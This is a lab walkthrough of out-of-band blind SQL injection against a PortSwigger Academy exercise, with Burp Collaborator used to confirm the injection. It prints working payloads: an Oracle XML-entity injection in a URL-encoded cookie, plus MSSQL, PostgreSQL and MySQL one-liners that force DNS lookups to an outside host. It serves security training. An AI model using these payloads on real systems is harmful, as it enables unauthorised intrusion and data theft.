
---

# SQL Injection - Lab #15: Blind SQL Injection with Out-of-Band Interaction

**YouTube Tutorial:** [SQL Injection - Lab #15 Blind SQL injection with out-of-band interaction](http://www.youtube.com/watch?v=-t4cr5uRzzA)

---

## 1. What is Out-of-Band (OAST) Blind SQL Injection?

### Core Concept

When an application is vulnerable to SQL injection, but backend queries execute **asynchronously**, the application returns identical HTTP responses regardless of query results or delays. Because there is no visible output, no error feedback, and no response delay differences, traditional in-band (boolean/time-based) techniques fail.

**Out-of-Band SQL Injection (OAST)** bypasses this by forcing the database server to initiate an external network connection (such as a DNS lookup or HTTP request) to a domain controlled by the attacker (e.g., **Burp Collaborator**):

* **If the SQL injection payload executes:** The database makes an external request to the attacker's server, providing definitive proof of the vulnerability.
* **If the payload fails or is blocked:** No interaction is received by the external server.

---

## 2. Attack Overview & Key Concepts

### Vulnerability Explanation

* **Vulnerable Parameter:** The `TrackingId` cookie value processed in backend SQL queries.
* **Blind SQL Injection Mechanism:** Backend queries run asynchronously, leaving HTTP responses completely unaffected by query execution.
* **Out-of-Band Mechanism:** Injected database functions (such as Oracle's `EXTRACTVALUE` combined with `xmltype`) induce network lookup attempts directly from the application database server to an external listener domain.

### Root Cause & Impact

* **Root Cause:** Direct concatenation of user-supplied cookie values into SQL queries without input sanitization or parameterized statements.
* **End Goal:** Exploit the SQL injection vulnerability to trigger a **DNS lookup** to Burp Collaborator, confirming out-of-band control.

---

## 3. Attack Methods & Techniques

### Method Details

* **Phase 1 (Collaborator Domain Setup):** Generate a unique subdomain using **Burp Collaborator Client**.
* **Phase 2 (DBMS Payload Construction):** Craft an Oracle-specific XML network lookup payload incorporating the Burp Collaborator subdomain.
* **Phase 3 (Payload Injection):** Concatenate the payload onto the `TrackingId` cookie using `' || (...)--` and URL-encode the header value.
* **Phase 4 (Interaction Verification):** Poll Burp Collaborator Client to catch and verify incoming DNS/HTTP lookup events.

### Server Behavior

* **Application Response:** Returns normal HTTP status (200 OK) with standard body content regardless of payload execution.
* **Out-of-Band Event:** The database backend resolves the custom domain name, creating a log entry in the Burp Collaborator Client interface.

---

## 4. Step-by-Step Walkthrough

### Step 1: Generate Burp Collaborator Subdomain

1. Open **Burp Suite Professional**.
2. Go to the **Burp** menu at the top and select **Burp Collaborator client**.
3. Click **Copy to clipboard** to copy your unique collaborator subdomain (e.g., `BURP-COLLABORATOR-SUBDOMAIN.collaborator.net`).

---

### Step 2: Construct Out-of-Band SQL Injection Payload

Construct an Oracle database payload utilizing `extractvalue()` and `xmltype()` to force a DNS resolution attempt:

```sql
' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-COLLABORATOR-SUBDOMAIN.collaborator.net"> %remote; ]>'),'/l') FROM dual)--

```

* Replace `YOUR-COLLABORATOR-SUBDOMAIN.collaborator.net` with the unique domain copied from Burp Collaborator.

---

### Step 3: Inject Payload into Cookie Parameter

1. Intercept a browser request in Burp Suite and send it to **Repeater**.
2. Replace the `TrackingId` cookie value with your crafted payload:

```http
GET / HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Cookie: TrackingId=vulnerable_cookie%27+%7C%7C+%28SELECT+extractvalue%28xmltype%28%27%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE+root+%5B+%3C%21ENTITY+%25+remote+SYSTEM+%22http%3A%2F%2FYOUR-COLLABORATOR-SUBDOMAIN.collaborator.net%22%3E+%25remote%3B+%5D%3E%27%29%2C%27%2Fl%27%29+FROM+dual%29--

```

3. Ensure the payload is fully **URL-encoded** (`Ctrl + U` / `Cmd + U`).
4. Click **Send**.

---

### Step 4: Verify DNS Lookup in Burp Collaborator

1. Return to the **Burp Collaborator client** window.
2. Click **Poll now**.
3. Review the received interaction table:
* **Entry Type:** `DNS` / `HTTP`
* **Source IP:** IP address matching the target application host.


4. Receiving this interaction confirms the SQL injection execution, and the lab status updates to **"Congratulations, you solved the lab!"**.

---

## 5. Pro-Tips & Common Pitfalls

* **Burp Suite Professional Requirement:** Out-of-band testing on the PortSwigger Academy requires Burp Collaborator (`collaborator.net`) because external firewall rules block interactions with arbitrary public domains.
* **DBMS Payload Differences:** Different database engines use different functions to trigger DNS lookups:
* **Oracle:** `SELECT extractvalue(xmltype(...),'/l') FROM dual`
* **Microsoft SQL Server:** `EXEC master..xp_dirtree '\\YOUR-SUBDOMAIN.collaborator.net\a'`
* **PostgreSQL:** `COPY (SELECT '') TO PROGRAM 'nslookup YOUR-SUBDOMAIN.collaborator.net'`
* **MySQL:** `SELECT LOAD_FILE('\\\\YOUR-SUBDOMAIN.collaborator.net\\a')`


* **Proper URL Encoding:** Special characters like `'`, `<`, `>`, `%`, and spaces must be properly URL-encoded inside HTTP headers to avoid bad header format errors.